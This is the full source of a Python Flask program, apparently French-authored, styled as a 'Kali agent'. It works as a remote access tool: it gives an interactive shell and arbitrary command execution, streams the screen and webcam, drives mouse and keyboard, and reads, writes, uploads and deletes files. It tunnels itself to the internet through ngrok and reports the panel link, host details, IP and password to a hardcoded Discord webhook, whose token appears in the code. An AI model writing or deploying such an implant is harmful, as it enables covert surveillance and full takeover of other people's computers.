#!/usr/bin/env python3
import os, sys, json, base64, io, time, threading, signal, pty, select, struct, fcntl, termios
import subprocess, requests, tempfile, shutil, mimetypes, re
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file, Response, abort
from flask_socketio import SocketIO, emit

# ===== CONFIG =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1516834045026369709/523I42gDEz_0P1WKwi2-q8oNCUNLzulgF2AS749llpNJGsCNvaB9x59fdq8xalKgZGkN"
NGROK_AUTH_TOKEN = ""
PORT = 5000
PASSWORD = "kali"

app = Flask(__name__, template_folder="templates")
app.config["SECRET_KEY"] = os.urandom(16).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ===== GLOBALS =====
shell_fd = None
shell_pid = None
current_dir = os.path.expanduser("~")
camera = None
ngrok_url = None

# ===== ANSI STRIP =====
ansi_re = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
def strip_ansi(text):
    return ansi_re.sub('', text)

# ===== SHELL =====
def start_shell():
    global shell_fd, shell_pid
    pid, fd = pty.fork()
    if pid == 0:
        os.environ["TERM"] = "xterm-256color"
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
    else:
        shell_fd = fd
        shell_pid = pid
        threading.Thread(target=shell_reader, daemon=True).start()

def shell_reader():
    buf = ""
    while True:
        try:
            r, _, _ = select.select([shell_fd], [], [], 0.1)
            if r:
                data = os.read(shell_fd, 4096)
                if not data:
                    break
                decoded = data.decode("utf-8", errors="replace")
                buf += decoded
                if "\n" in decoded or len(buf) > 200:
                    clean = strip_ansi(buf)
                    socketio.emit("shell:data", {"data": clean})
                    buf = ""
        except:
            break

def set_window_size(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)

# ===== SCREEN CAPTURE (with cursor) =====
def capture_screen():
    try:
        result = subprocess.run(
            ["import", "-window", "root", "-quality", "70", "png:-"],
            capture_output=True, timeout=5
        )
        if result.stdout:
            return base64.b64encode(result.stdout).decode()
    except:
        pass
    try:
        import mss
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            img = sct.grab(monitor)
            from PIL import Image
            buffer = io.BytesIO()
            Image.frombytes("RGB", img.size, img.rgb).save(buffer, "JPEG", quality=70)
            return base64.b64encode(buffer.getvalue()).decode()
    except:
        return None

def screen_stream():
    while True:
        try:
            img = capture_screen()
            if img:
                socketio.emit("screen:frame", {"image": img})
            time.sleep(0.1)
        except:
            break

# ===== WEBCAM =====
def get_webcam():
    global camera
    try:
        import cv2
        if camera is None:
            camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            _, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
            return base64.b64encode(buffer).decode()
        return None
    except:
        return None

def webcam_stream():
    while True:
        try:
            img = get_webcam()
            if img:
                socketio.emit("webcam:frame", {"image": img})
            time.sleep(0.08)
        except:
            break

# ===== REMOTE CONTROL (mouse + keyboard) =====
def get_screen_size():
    try:
        r = subprocess.run(["xdotool", "getdisplaygeometry"], capture_output=True, text=True, timeout=5)
        w, h = r.stdout.strip().split()
        return int(w), int(h)
    except:
        return 1920, 1080

def remote_mousemove(x, y):
    subprocess.run(["xdotool", "mousemove", "--sync", str(x), str(y)], timeout=5)

def remote_click(button):
    btn_map = {"left": "1", "middle": "2", "right": "3"}
    b = btn_map.get(button, "1")
    subprocess.run(["xdotool", "click", b], timeout=5)

def remote_mousedown(button):
    btn_map = {"left": "1", "middle": "2", "right": "3"}
    b = btn_map.get(button, "1")
    subprocess.run(["xdotool", "mousedown", b], timeout=5)

def remote_mouseup(button):
    btn_map = {"left": "1", "middle": "2", "right": "3"}
    b = btn_map.get(button, "1")
    subprocess.run(["xdotool", "mouseup", b], timeout=5)

def remote_key(key):
    subprocess.run(["xdotool", "key", key], timeout=5)

def remote_type(text):
    import shlex
    subprocess.run(["xdotool", "type", "--", text], timeout=5)

# ===== FILE OPS =====
def safe_path(path):
    global current_dir
    if not os.path.isabs(path):
        path = os.path.join(current_dir, path)
    path = os.path.realpath(path)
    return path

# ===== AUTH CHECK =====
def check_auth(req):
    auth = req.headers.get("Authorization", "")
    if auth == PASSWORD:
        return True
    auth = req.args.get("auth", "")
    return auth == PASSWORD

@app.before_request
def before_request():
    if request.endpoint and request.endpoint not in ("panel", "static") and request.method != "OPTIONS":
        if not check_auth(request):
            return jsonify({"error": "Unauthorized"}), 401

# ===== ROUTES =====
@app.route("/")
def panel():
    auth = request.args.get("auth", "")
    if auth != PASSWORD:
        return '<html><body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh"><form method="GET"><input type="password" name="auth" placeholder="Password" style="background:#111;color:#0f0;border:1px solid#0f0;padding:10px;font-family:monospace;font-size:16px"><input type="submit" value="ENTRER" style="background:#0f0;color:#000;border:none;padding:10px;font-family:monospace;font-size:16px;cursor:pointer"></form></body></html>'
    return render_template("panel.html", password=PASSWORD)

@app.route("/api/auth", methods=["POST"])
def api_auth():
    data = request.json
    if data.get("password") == PASSWORD:
        return jsonify({"ok": True})
    return jsonify({"ok": False}), 401

@app.route("/api/screenshot")
def api_screenshot():
    img = capture_screen()
    if img:
        return jsonify({"image": img})
    return jsonify({"error": "Failed"}), 500

@app.route("/api/webcam")
def api_webcam():
    img = get_webcam()
    if img:
        return jsonify({"image": img})
    return jsonify({"error": "No camera"}), 500

@app.route("/api/ls")
def api_ls():
    global current_dir
    path = request.args.get("path", current_dir)
    real = safe_path(path)
    if not os.path.isdir(real):
        return jsonify({"error": "Not a directory"}), 400
    current_dir = real
    items = []
    for item in os.listdir(real):
        full = os.path.join(real, item)
        try:
            items.append({
                "name": item,
                "type": "dir" if os.path.isdir(full) else "file",
                "size": os.path.getsize(full) if os.path.isfile(full) else 0,
                "mtime": os.path.getmtime(full)
            })
        except:
            pass
    return jsonify({"path": real, "items": items})

@app.route("/api/download")
def api_download():
    path = safe_path(request.args.get("path", ""))
    if not os.path.isfile(path):
        abort(404)
    return send_file(path, as_attachment=True)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    path = safe_path(request.args.get("path", current_dir))
    if "file" not in request.files:
        return jsonify({"error": "No file"}), 400
    file = request.files["file"]
    filepath = os.path.join(path, file.filename)
    file.save(filepath)
    return jsonify({"ok": True, "path": filepath})

@app.route("/api/read", methods=["POST"])
def api_read():
    data = request.json
    path = safe_path(data.get("path", ""))
    if not os.path.isfile(path):
        return jsonify({"error": "Not a file"}), 404
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
        return jsonify({"content": content, "path": path})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/write", methods=["POST"])
def api_write():
    data = request.json
    path = safe_path(data.get("path", ""))
    content = data.get("content", "")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/delete", methods=["POST"])
def api_delete():
    data = request.json
    path = safe_path(data.get("path", ""))
    if os.path.isfile(path):
        os.remove(path)
    elif os.path.isdir(path):
        shutil.rmtree(path)
    else:
        return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/exec", methods=["POST"])
def api_exec():
    data = request.json
    cmd = data.get("cmd", "")
    try:
        result = subprocess.run(
            ["bash", "-c", cmd],
            capture_output=True, text=True, timeout=30
        )
        return jsonify({
            "stdout": strip_ansi(result.stdout),
            "stderr": strip_ansi(result.stderr),
            "code": result.returncode
        })
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Timeout"}), 500

@app.route("/api/info")
def api_info():
    try:
        uname = os.uname()
        host = os.popen("hostname").read().strip()
        user = os.getenv("USER", "unknown")
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        sw, sh = get_screen_size()
        return jsonify({
            "hostname": host,
            "os": f"{uname.sysname} {uname.release}",
            "user": user,
            "cwd": current_dir,
            "ip": ip,
            "screen": f"{sw}x{sh}",
            "screen_w": sw,
            "screen_h": sh,
            "uptime": os.popen("uptime -p").read().strip() if os.path.exists("/proc/uptime") else "N/A"
        })
    except Exception as e:
        return jsonify({"hostname": "unknown", "error": str(e)})

@app.route("/api/sysinfo")
def api_sysinfo():
    try:
        mem = {}
        with open("/proc/meminfo") as f:
            for line in f:
                if "MemTotal" in line: mem["total"] = int(line.split()[1]) // 1024
                if "MemAvailable" in line: mem["avail"] = int(line.split()[1]) // 1024
                if "SwapTotal" in line: mem["swap_total"] = int(line.split()[1]) // 1024
                if "SwapFree" in line: mem["swap_free"] = int(line.split()[1]) // 1024
        if "avail" in mem:
            mem["used"] = mem["total"] - mem["avail"]
        disk = shutil.disk_usage("/")
        cpu = os.popen("grep 'model name' /proc/cpuinfo | head -1").read().strip().split(":")[-1].strip() if os.path.exists("/proc/cpuinfo") else "N/A"
        cores = os.cpu_count() or 0
        load = os.getloadavg() if hasattr(os, "getloadavg") else (0,0,0)
        processes = len(os.popen("ps aux").read().split("\n")) - 1 if os.path.exists("/usr/bin/ps") else 0
        return jsonify({
            "memory": {
                "total_mb": mem.get("total", 0),
                "used_mb": mem.get("used", 0),
                "avail_mb": mem.get("avail", 0),
                "swap_total_mb": mem.get("swap_total", 0),
                "swap_free_mb": mem.get("swap_free", 0)
            },
            "disk": {
                "total_gb": round(disk.total / (1024**3), 1),
                "used_gb": round(disk.used / (1024**3), 1),
                "free_gb": round(disk.free / (1024**3), 1),
                "percent": round(disk.used / disk.total * 100, 1)
            },
            "cpu": {
                "model": cpu,
                "cores": cores,
                "load_1m": round(load[0], 2),
                "load_5m": round(load[1], 2),
                "load_15m": round(load[2], 2)
            },
            "processes": processes
        })
    except Exception as e:
        return jsonify({"error": str(e)})

# ===== SOCKETIO =====
@socketio.on("shell:input")
def handle_shell_input(data):
    global shell_fd
    if shell_fd:
        try:
            os.write(shell_fd, data["data"].encode())
        except:
            pass

@socketio.on("shell:resize")
def handle_shell_resize(data):
    global shell_fd
    if shell_fd:
        set_window_size(shell_fd, data.get("rows", 24), data.get("cols", 80))

@socketio.on("start:screen")
def handle_start_screen():
    threading.Thread(target=screen_stream, daemon=True).start()

@socketio.on("start:webcam")
def handle_start_webcam():
    threading.Thread(target=webcam_stream, daemon=True).start()

# ===== REMOTE CONTROL SOCKETS =====
@socketio.on("remote:mousemove")
def handle_remote_mousemove(data):
    threading.Thread(target=remote_mousemove, args=(data["x"], data["y"]), daemon=True).start()

@socketio.on("remote:click")
def handle_remote_click(data):
    remote_click(data.get("button", "left"))

@socketio.on("remote:mousedown")
def handle_remote_mousedown(data):
    remote_mousedown(data.get("button", "left"))

@socketio.on("remote:mouseup")
def handle_remote_mouseup(data):
    remote_mouseup(data.get("button", "left"))

@socketio.on("remote:key")
def handle_remote_key(data):
    remote_key(data["key"])

@socketio.on("remote:type")
def handle_remote_type(data):
    remote_type(data["text"])

# ===== NGROK =====
def start_ngrok():
    global ngrok_url
    try:
        from pyngrok import ngrok as ngrok_client
        if NGROK_AUTH_TOKEN:
            ngrok_client.set_auth_token(NGROK_AUTH_TOKEN)
        tunnel = ngrok_client.connect(PORT, "http")
        ngrok_url = tunnel.public_url
        print(f"[+] Ngrok URL: {ngrok_url}")
        return ngrok_url
    except:
        pass
    try:
        proc = subprocess.Popen(
            ["ngrok", "http", str(PORT), "--log", "stdout"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
        data = r.json()
        ngrok_url = data["tunnels"][0]["public_url"]
        print(f"[+] Ngrok URL: {ngrok_url}")
        return ngrok_url
    except:
        return None

def send_webhook(url):
    try:
        host = os.popen("hostname").read().strip()
        user = os.getenv("USER", "unknown")
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        embed = {
            "title": "🚀 Kali Agent Prêt",
            "color": 5763719,
            "fields": [
                {"name": "🔗 Panel", "value": f"{url}?auth={PASSWORD}", "inline": False},
                {"name": "🖥 Hostname", "value": host, "inline": True},
                {"name": "👤 User", "value": user, "inline": True},
                {"name": "🌍 IP", "value": ip, "inline": True},
                {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
            ],
            "footer": {"text": datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        print("[+] Webhook envoyé")
    except Exception as e:
        print(f"[-] Webhook error: {e}")

# ===== MAIN =====
if __name__ == "__main__":
    print("[+] Démarrage de l'agent Kali...")
    print(f"[+] Port: {PORT}")

    start_shell()
    print("[+] Shell PTY démarré")

    url = start_ngrok()
    if url:
        print(f"[+] URL publique: {url}")
        send_webhook(url)
        print(f"[+] Mot de passe: {PASSWORD}")
        print(f"[+] Lien direct: {url}?auth={PASSWORD}")
    else:
        print("[-] Ngrok non disponible, en local uniquement")
        print(f"[+] Accès local: http://127.0.0.1:{PORT}")

    socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
